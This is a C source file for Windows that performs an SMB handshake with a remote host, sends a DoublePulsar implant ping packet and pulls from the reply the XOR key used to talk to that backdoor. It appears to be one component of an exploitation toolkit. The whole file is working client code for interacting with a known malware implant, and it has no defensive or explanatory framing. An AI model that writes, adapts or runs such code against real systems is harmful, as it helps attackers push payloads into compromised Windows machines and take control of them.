#define _WIN32_WINNT 0x0601
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stddef.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <errno.h>
#include <time.h>
#include <signal.h>
#include <stdarg.h>
#include <limits.h>
#include <math.h>
#include <io.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <winsock2.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <limits.h>
#include "config.h"

extern SOCKET smb_connect(const char *ip, int port);

static int smb_send_all(SOCKET sock, const unsigned char *data, size_t length)
{
    size_t offset = 0;

    while (offset < length) {
        size_t remaining = length - offset;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int sent = send(sock, (const char *)data + offset, chunk, 0);

        if (sent == SOCKET_ERROR) {
            if (WSAGetLastError() == WSAEINTR)
                continue;
            return -1;
        }
        if (sent == 0)
            return -1;

        offset += (size_t)sent;
    }

    return 0;
}

static int smb_recv_all(SOCKET sock, unsigned char *data, size_t length)
{
    size_t offset = 0;

    while (offset < length) {
        size_t remaining = length - offset;
        int chunk = remaining > (size_t)INT_MAX ? INT_MAX : (int)remaining;
        int received = recv(sock, (char *)data + offset, chunk, 0);

        if (received == SOCKET_ERROR) {
            if (WSAGetLastError() == WSAEINTR)
                continue;
            return -1;
        }
        if (received == 0)
            return -1;

        offset += (size_t)received;
    }

    return 0;
}

static int smb_recv_packet(SOCKET sock, unsigned char **packet, size_t *packet_length)
{
    unsigned char header[4];
    size_t payload_length;
    unsigned char *buffer;

    if (packet == NULL || packet_length == NULL)
        return -1;

    *packet = NULL;
    *packet_length = 0;

    if (smb_recv_all(sock, header, sizeof(header)) != 0)
        return -1;

    payload_length = ((size_t)header[1] << 16) |
                     ((size_t)header[2] << 8) |
                     (size_t)header[3];

    buffer = (unsigned char *)malloc(sizeof(header) + payload_length);
    if (buffer == NULL)
        return -1;

    memcpy(buffer, header, sizeof(header));
    if (payload_length != 0 &&
        smb_recv_all(sock, buffer + sizeof(header), payload_length) != 0) {
        free(buffer);
        return -1;
    }

    *packet = buffer;
    *packet_length = sizeof(header) + payload_length;
    return 0;
}

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port)
{
    SOCKET sock = INVALID_SOCKET;
    unsigned char negotiate_packet[sizeof(SMB_NEGOTIATE_PKT)];
    unsigned char session_setup_packet[sizeof(SMB_SESSION_SETUP_PKT)];
    unsigned char tree_connect_packet[sizeof(SMB_TREE_CONNECT_PKT)];
    unsigned char ping_packet[sizeof(DP_PING_PKT)];
    unsigned char *response = NULL;
    size_t response_length = 0;
    unsigned char user_id[2];
    unsigned char tree_id[2];
    unsigned int result = 0;

    if (ip == NULL || port <= 0 || port > 65535)
        return 0;

    sock = smb_connect(ip, port);
    if (sock == INVALID_SOCKET)
        return 0;

    memcpy(negotiate_packet, SMB_NEGOTIATE_PKT, sizeof(SMB_NEGOTIATE_PKT));
    memcpy(session_setup_packet, SMB_SESSION_SETUP_PKT, sizeof(SMB_SESSION_SETUP_PKT));
    memcpy(tree_connect_packet, SMB_TREE_CONNECT_PKT, sizeof(SMB_TREE_CONNECT_PKT));
    memcpy(ping_packet, DP_PING_PKT, sizeof(DP_PING_PKT));

    if (smb_send_all(sock, negotiate_packet, sizeof(SMB_NEGOTIATE_PKT) - 1) != 0 ||
        smb_recv_packet(sock, &response, &response_length) != 0)
        goto cleanup;
    free(response);
    response = NULL;

    if (smb_send_all(sock, session_setup_packet, sizeof(SMB_SESSION_SETUP_PKT) - 1) != 0 ||
        smb_recv_packet(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;

    user_id[0] = response[32];
    user_id[1] = response[33];
    free(response);
    response = NULL;

    tree_connect_packet[32] = user_id[0];
    tree_connect_packet[33] = user_id[1];
    if (smb_send_all(sock, tree_connect_packet, sizeof(SMB_TREE_CONNECT_PKT) - 1) != 0 ||
        smb_recv_packet(sock, &response, &response_length) != 0)
        goto cleanup;
    if (response_length < 34)
        goto cleanup;

    tree_id[0] = response[28];
    tree_id[1] = response[29];
    free(response);
    response = NULL;

    ping_packet[28] = tree_id[0];
    ping_packet[29] = tree_id[1];
    ping_packet[32] = user_id[0];
    ping_packet[33] = user_id[1];
    if (smb_send_all(sock, ping_packet, sizeof(DP_PING_PKT) - 1) != 0 ||
        smb_recv_packet(sock, &response, &response_length) != 0)
        goto cleanup;

    if (SMB_RESP_SIGNATURE_END < SMB_RESP_SIGNATURE_START ||
        SMB_RESP_SIGNATURE_END - SMB_RESP_SIGNATURE_START != 4 ||
        response_length < (size_t)SMB_RESP_SIGNATURE_END)
        goto cleanup;

    result = (unsigned int)response[SMB_RESP_SIGNATURE_START] |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 1] << 8) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 2] << 16) |
             ((unsigned int)response[SMB_RESP_SIGNATURE_START + 3] << 24);

cleanup:
    free(response);
    closesocket(sock);
    return result;
}